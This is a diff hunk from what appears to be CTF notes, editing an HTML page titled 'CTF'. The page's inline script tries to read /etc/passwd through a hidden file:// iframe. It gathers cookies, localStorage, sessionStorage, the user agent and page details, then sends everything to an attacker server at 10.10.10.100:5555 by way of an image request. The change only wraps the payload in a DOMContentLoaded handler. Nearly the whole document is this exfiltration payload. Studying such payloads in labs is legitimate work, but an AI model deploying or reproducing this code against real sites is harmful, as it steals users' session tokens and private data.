@@ -101,73 +101,75 @@ sudo python3 -m http.server 4444
   <head>
     <title>CTF</title>
     <script>
-      (async function() {
-        const YOUR_SERVER_IP = "10.10.10.100";
-        const targetFile = "/etc/passwd";  // Example file path to try LFI
-        
-        try {
-          // Attempt to load a local file via image or another method
-          var iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = `file://${targetFile}`;  // Adjust based on the vulnerability you're exploiting
-          document.body.appendChild(iframe);
+      document.addEventListener('DOMContentLoaded', (event) => {
+        (async function() {
+          const YOUR_SERVER_IP = "10.10.10.100";
+          const targetFile = "/etc/passwd";  // Example file path to try LFI
+          
+          try {
+            // Attempt to load a local file via image or another method
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `file://${targetFile}`;  // Adjust based on the vulnerability you're exploiting
+            document.body.appendChild(iframe);
 
-          // Delay to give time for the iframe to load
-          await new Promise(resolve => setTimeout(resolve, 2000));
+            // Delay to give time for the iframe to load
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
-          // Collect User-Agent
-          let userAgent = navigator.userAgent;
+            // Collect User-Agent
+            let userAgent = navigator.userAgent;
 
-          // Collect Cookies
-          let cookies = document.cookie;
+            // Collect Cookies
+            let cookies = document.cookie;
 
-          // Collect Local Storage Data
-          let localStorageData = {};
-          for (let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            localStorageData[key] = localStorage.getItem(key);
+            // Collect Local Storage Data
+            let localStorageData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+              let key = localStorage.key(i);
+              localStorageData[key] = localStorage.getItem(key);
+            }
+
+            // Collect Session Storage Data
+            let sessionStorageData = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+              let key = sessionStorage.key(i);
+              sessionStorageData[key] = sessionStorage.getItem(key);
+            }
+
+            // Collect Document Properties
+            let documentData = {
+              title: document.title,
+              url: document.URL,
+              referrer: document.referrer,
+              domain: document.domain
+            };
+
+            // Try to grab content from the iframe (if accessible)
+            let fileContents = iframe.contentDocument ? iframe.contentDocument.body.innerText : "File access failed";
+
+            // Create a final object to hold all the data
+            let data = {
+              userAgent: userAgent,
+              cookies: cookies,
+              localStorage: localStorageData,
+              sessionStorage: sessionStorageData,
+              document: documentData,
+              fileContents: fileContents
+            };
+
+            // Send the data to your server
+            let img = new Image();
+            img.src = `http://${YOUR_SERVER_IP}:5555/?allData=` + encodeURIComponent(JSON.stringify(data));
+
+            // Clean up the iframe
+            document.body.removeChild(iframe);
+
+          } catch (error) {
+            let img = new Image();
+            img.src = `http://${YOUR_SERVER_IP}:5555/?error=` + encodeURIComponent(error);
           }
-
-          // Collect Session Storage Data
-          let sessionStorageData = {};
-          for (let i = 0; i < sessionStorage.length; i++) {
-            let key = sessionStorage.key(i);
-            sessionStorageData[key] = sessionStorage.getItem(key);
-          }
-
-          // Collect Document Properties
-          let documentData = {
-            title: document.title,
-            url: document.URL,
-            referrer: document.referrer,
-            domain: document.domain
-          };
-
-          // Try to grab content from the iframe (if accessible)
-          let fileContents = iframe.contentDocument ? iframe.contentDocument.body.innerText : "File access failed";
-
-          // Create a final object to hold all the data
-          let data = {
-            userAgent: userAgent,
-            cookies: cookies,
-            localStorage: localStorageData,
-            sessionStorage: sessionStorageData,
-            document: documentData,
-            fileContents: fileContents
-          };
-
-          // Send the data to your server
-          let img = new Image();
-          img.src = `http://${YOUR_SERVER_IP}:5555/?allData=` + encodeURIComponent(JSON.stringify(data));
-
-          // Clean up the iframe
-          document.body.removeChild(iframe);
-
-        } catch (error) {
-          let img = new Image();
-          img.src = `http://${YOUR_SERVER_IP}:5555/?error=` + encodeURIComponent(error);
-        }
-      })();
+        })();
+      });
     </script>
   </head>
   <body>
